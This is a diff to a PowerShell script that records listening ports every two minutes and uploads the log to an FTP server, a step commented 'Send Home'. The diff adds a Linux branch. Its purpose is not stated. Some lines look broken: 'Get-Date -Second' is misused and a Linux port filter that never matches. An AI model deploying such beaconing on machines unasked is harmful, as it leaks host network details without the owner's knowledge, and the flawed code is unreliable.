@@ -9,11 +9,15 @@ $localFile = ".\cracklins.log"
 $webclient = New-Object System.Net.WebClient
 $webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
 
-#main loop. script will run every 2 minutes for 1 hour (30 loops):
+if ($IsWindows) {
+#man LinRun loop. script will run every 2 min for 1 hr (x30):
 
 for ($cnt = 1; $cnt -le 30; $cnt++)
 
 {
+
+#Mark OS
+Write-Host "Windows"
 
 #Get Time For FileName:
 Get-Date -Second | Out-File -FilePath .\cracklins.log -Append
@@ -27,4 +31,30 @@ $webclient.UploadFile($ftp, $localFile)
 #2 min sleep
 Start-Sleep 120
 
+}
+}
+
+elseif ($IsLinux) {
+#man LinRun loop. script will run every 2 min for 1 hr (x30):
+
+for ($cnt = 1; $cnt -le 30; $cnt++)
+
+{
+
+#Mark OS
+Write-Host "Linux"
+
+#Get Time For FileName:
+Get-Date -Second | Out-File -FilePath .\cracklins.log -Append
+
+#Collect Open Ports:
+netstat -an | Select-String "LISTENING" | Out-File -FilePath .\cracklins.log -Append
+
+#Send Home:
+$webclient.UploadFile($ftp, $localFile)
+
+#2 min sleep
+Start-Sleep 120
+
+}
 }
